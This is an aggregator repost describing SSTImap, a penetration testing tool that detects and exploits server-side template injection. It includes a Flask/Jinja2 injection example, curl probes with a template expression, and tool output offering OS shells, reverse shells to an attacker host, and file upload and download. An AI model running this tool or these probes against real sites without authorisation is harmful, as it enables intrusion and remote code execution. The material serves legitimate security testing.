---
title: SSTImap - Automatic SSTI Detection Tool With Interactive Interface
url: https://buaq.net/go-146940.html
source: unSafe.sh - 不安全
date: 2023-01-29
fetch_date: 2025-10-04T05:07:03.243200
---

# SSTImap - Automatic SSTI Detection Tool With Interactive Interface

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/169ac82047c1e5a3cb3323b831ab5218.jpg)

SSTImap - Automatic SSTI Detection Tool With Interactive Interface

SSTImap is a penetration testing software that can check websites for Code Injection and Ser
*2023-1-28 19:30:0
Author: [www.kitploit.com(查看原文)](/jump-146940.htm)
阅读量:50
收藏*

---

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPMjwmvkC102YnRcbDX88-WrbzI5UOEazsfd59SwlA28dyrgtAxZdmS1bk0CM6EgAS0OuGRXF22rgb_3jtt3E8Co_pWbIGH97B-He8A8Yt4Tfw6Ic4oKCTebznmbUt-QEsd9WsovIfN6syT-vWMezfKRy_7StMx5bqXixMQ57EFOx5ErrDL3vOuRNXiA/w640-h356/sstimap.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPMjwmvkC102YnRcbDX88-WrbzI5UOEazsfd59SwlA28dyrgtAxZdmS1bk0CM6EgAS0OuGRXF22rgb_3jtt3E8Co_pWbIGH97B-He8A8Yt4Tfw6Ic4oKCTebznmbUt-QEsd9WsovIfN6syT-vWMezfKRy_7StMx5bqXixMQ57EFOx5ErrDL3vOuRNXiA/s1320/sstimap.png)

SSTImap is a [penetration testing](https://www.kitploit.com/search/label/Penetration%20Testing "penetration testing") software that can check websites for Code Injection and Server-Side Template Injection [vulnerabilities](https://www.kitploit.com/search/label/vulnerabilities "vulnerabilities") and exploit them, giving access to the operating system itself.

This tool was developed to be used as an interactive penetration testing tool for SSTI detection and exploitation, which allows more advanced exploitation.

Sandbox break-out techniques came from:

* James Kett's [Server-Side Template Injection: RCE For The Modern Web App](http://blog.portswigger.net/2015/08/server-side-template-injection.html "Server-Side Template Injection: RCE For The Modern Web App")
* Other public researches [[1]](https://artsploit.blogspot.co.uk/2016/08/pprce2.html "[1]") [[2]](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/ "[2]")
* Contributions to Tplmap [[3]](https://github.com/epinna/tplmap/issues/9 "[3]") [[4]](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine "[4]").

This tool is capable of exploiting some code context escapes and blind injection scenarios. It also supports *eval()*-like code injections in Python, Ruby, PHP, Java and generic unsandboxed template engines.

## Differences with Tplmap

Even though this software is based on Tplmap's code, backwards compatibility is not provided.

* Interactive mode (`-i`) allowing for easier [exploitation](https://www.kitploit.com/search/label/Exploitation "exploitation") and detection
* Base language *eval()*-like shell (`-x`) or single command (`-X`) execution
* Added new payload for *Smarty* without enabled `{php}{/php}`. Old payload is available as `Smarty_unsecure`.
* User-Agent can be randomly selected from a list of desktop browser agents using `-A`
* SSL verification can now be enabled using `-V`
* Short versions added to all arguments
* Some old [command line](https://www.kitploit.com/search/label/Command%20Line "command line") arguments were changed, check `-h` for help
* Code is changed to use newer python features
* Burp Suite extension temporarily removed, as *Jython* doesn't support Python3

## Server-Side Template Injection

This is an example of a simple website written in Python using [Flask](http://flask.pocoo.org/ "Flask") framework and [Jinja2](http://jinja.pocoo.org/ "Jinja2") template engine. It integrates user-supplied variable `name` in an unsafe way, as it is concatenated to the template string before rendering.

```
from flask import Flask, request, render_template_string
```

Not only this way of using templates creates XSS vulnerability, but it also allows the attacker to inject template code, that will be executed on the server, leading to SSTI.

```
$ curl -g 'https://www.target.com/page?name=John'
Hello John!<br>
OS type: posix
$ curl -g 'https://www.target.com/page?name={{7*7}}'
Hello 49!<br>
OS type: posix
```

User-supplied input should be introduced in a safe way through rendering context:

```
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

@app.route("/page")
def page():
    name = request.args.get('name', 'World')
    template = "Hello, {{name}}!<br>\n" \
               "OS type: {{os}}"
    return render_template_string(template, name=name, os=os.name)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```

## Predetermined mode

SSTImap in predetermined mode is very similar to Tplmap. It is capable of detecting and exploiting SSTI vulnerabilities in multiple different templates.

After the exploitation, SSTImap can provide access to code evaluation, OS command execution and file system manipulations.

To check the URL, you can use `-u` argument:

```
$ ./sstimap.py -u https://example.com/page?name=John

╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚═════════════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] Testing if GET parameter 'name' is injectable
[*] Smarty plugin is testing rendering with tag '*'
...
[*] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] SSTImap identified the following injection point:

GET parameter: name
  Engine: Jinja2
  Injecti   on: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, python code

[+] Rerun SSTImap providing one of the following options:
    --os-shell                   Prompt for an interactive operating system shell
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port
    --reverse-shell HOST PORT    Send a shell back to the attacker's    port
    --upload LOCAL REMOTE        Upload files to the server
    --download REMOTE LOCAL      Download remote files
```

Use `--os-shell` option to launch a pseudo-terminal on the target.

```
$ ./sstimap.py -u https://example.com/page?name=John --os-shell

╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║ _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 0.6#dev
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liabi...